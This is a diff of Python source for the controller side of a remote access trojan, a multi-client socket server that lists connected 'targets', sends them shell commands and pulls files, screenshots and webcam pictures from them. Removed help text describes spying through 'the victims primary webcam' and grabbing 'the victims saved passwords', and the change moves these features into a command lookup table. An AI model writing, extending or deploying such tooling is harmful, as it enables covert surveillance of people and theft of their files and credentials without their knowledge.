@@ -1,3 +1,5 @@
+# special thanks to "Bucky Roberts" for how to do the multi client server
+
 import socket
 import threading
 import time
@@ -6,23 +8,26 @@ from queue import Queue
 import struct
 import signal
 import os
+import commands
 
 NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1, 2]
 queue = Queue()
 
-HANDLER_COMMANDS = {'help': ['Shows this help'],
-            'list': ['Lists connected clients'],
-            'select': ['Selects a client by its index. Takes index as a parameter'],
-            'quit': ['Stops current connection with a client. To be used when client is selected'],
-            'exit': ['Shuts server down'],}
+HANDLER_COMMANDS = {'help': ['\t\tShows this help'],
+            'list': ['\t\tLists connected clients'],
+            'select': ['\t\tSelects a client by its index'],
+            'exit|quit': ['\tStops current connection with a client'],
+            'clear': ['\t\tclear terminal'],
+            'shutdown': ['\tShuts server down'],}
 
-CUSTOM_COMMANDS = {'help': ['Shows help menu'],
-            'screenshot': ['Take a screenshot of the targets screen'],
-            'download': ['Download chosen file from the target'],
-            'webcam': ['Transfers a picture from the victims primary webcam'],
-            'livecam': ['Transfers a video from the victims primary webcam'],
-            'getpass': ['Attempts to grab the victims saved passwords'],}
+command_lookup = {
+    "help": commands.print_help,
+    "download": commands.download,
+    "screenshot": commands.screenshot,
+    "webcam": commands.webcam,
+    "clear": commands.clear_screen
+}
 
 class MultiServer(object):
 
@@ -34,8 +39,10 @@ class MultiServer(object):
         self.all_addresses = []
 
     def print_help(self):
+        print("=================================================================")
         for cmd, v in HANDLER_COMMANDS.items():
-            print("{0}:\t{1}".format(cmd, v[0]))
+            print("{0}:{1}".format(cmd, v[0]))
+        print("=================================================================")
         return
 
     def register_signal_handler(self):
@@ -101,7 +108,9 @@ class MultiServer(object):
         """ Interactive prompt for sending commands remotely """
         while True:
             cmd = input('handler> ')
-            if cmd == 'list':
+            if cmd == 'clear' or cmd == 'cls':
+                os.system('cls')
+            elif cmd == 'list':
                 self.list_connections()
                 continue
             elif 'select' in cmd:
@@ -111,7 +120,7 @@ class MultiServer(object):
             elif cmd == 'shutdown':
                     queue.task_done()
                     queue.task_done()
-                    print('Server shutdown')
+                    print('server shutting down...\n')
                     break
                     # self.quit_gracefully()
             elif cmd == 'help':
@@ -156,6 +165,7 @@ class MultiServer(object):
         print("You are now connected to " + str(self.all_addresses[target][2]))
         return target, conn
 
+    # these bottom 2 function thanks thenewboston
     def read_command_output(self, conn):
         """ Read message length and unpack it into an integer
         :param conn:
@@ -182,7 +192,8 @@ class MultiServer(object):
         return data
 
     def send_target_commands(self, target, conn):
-        """ Connect with remote target client 
+        """ 
+        Connect with remote target client 
         :param conn: 
         :param target: 
         """
@@ -190,83 +201,33 @@ class MultiServer(object):
         cwd_bytes = self.read_command_output(conn)
         cwd = str(cwd_bytes, "utf-8")
         print(cwd, end="")
+
         while True:
             try:
                 shell = input()
-                if shell[:8] == 'download':
-                    conn.send(str.encode('download'))
-                    if len(shell) > 8:
-                        filename = str(shell[9:])
-                    else:
-                        filename = input("FileName: ")
-                    conn.send(str.encode(filename))
-                    m = conn.recv(1024)
-                    if not 'FileNotFound' in str(m):
-                        f = open(filename, 'wb')
-                        i = conn.recv(1024)
-                        while not ('complete' in str(i)):
-                            f.write(i)
-                            i = conn.recv(1024)
-                        f.close()
-                        print(str(filename) + ' successfully saved to: ' + str(os.path.dirname(os.path.realpath(__file__))))
-                    else:
-                        print("File Not Found")
-                    continue
-
-
-                elif shell[:10].lower() == 'screenshot':
-                    conn.send(str.encode('capturing'))
-                    print('capturing screen...')
-                    if len(shell) > 10:
-                        if '.png' in str(shell[11:]):
-                            f = open(str(shell[11:]), 'wb')
-                        else:
-                            f = open(str(shell[11:]) + '.png', 'wb')
-                    else:
-                        number = 1
-                        f = open('screenshot' + str(number) + '.png', 'wb')
-                        number += 1
-                    img = conn.recv(1024)
-                    f.write(img)
-                    #print(str(img))
-                    while not ('complete' in str(img)):
-                        img = conn.recv(1024)
-                        #print(str(img))
-                        f.write(img)
-                    f.close()
-                    print('screenshot successfully transfered!')
-                    continue
-
-
-                elif shell[:6] == 'webcam':
-                    conn.send(str.encode('snap'))
-                    f = open('camera.png', 'wb')
-                    img = conn.recv(1024)
-                    f.write(img)
-                    while not('complete' in str(img)):
-                        img = conn.recv(1024)
-                        f.write(img)
-                    f.close()
-                    continue
-
-                if len(str.encode(shell)) > 0:
-                    conn.send(str.encode(shell))
+                try:
+                    command_lookup[shell.split()[0]](conn, shell)
+                    conn.send(str.encode("whoami"))
+                except:
+                    if len(str.encode(shell)) > 0:
+                        conn.send(str.encode(shell))
+                    if shell == 'quit' or shell == 'exit':
+                        break
+                finally:
                     cmd_output = self.read_command_output(conn)
                     client_response = str(cmd_output, "utf-8")
                     print(client_response, end="")
-                
-                if shell == 'quit':
-                    break
             except Exception as e:
                 print("Connection was lost %s" %str(e))
                 break
+
         del self.all_connections[target]
         del self.all_addresses[target]
         return
 
 
 def create_workers():
-    """ Create worker threads (will die when main exits) """
+    """ Create worker threads """
     server = MultiServer()
     server.register_signal_handler()
     for _ in range(NUMBER_OF_THREADS):
@@ -277,9 +238,6 @@ def create_workers():
 
 
 def work(server):
-    """ Do the next job in the queue (thread for handling connections, another for sending commands)
-    :param server:
-    """
     while True:
         x = queue.get()
         if x == 1:
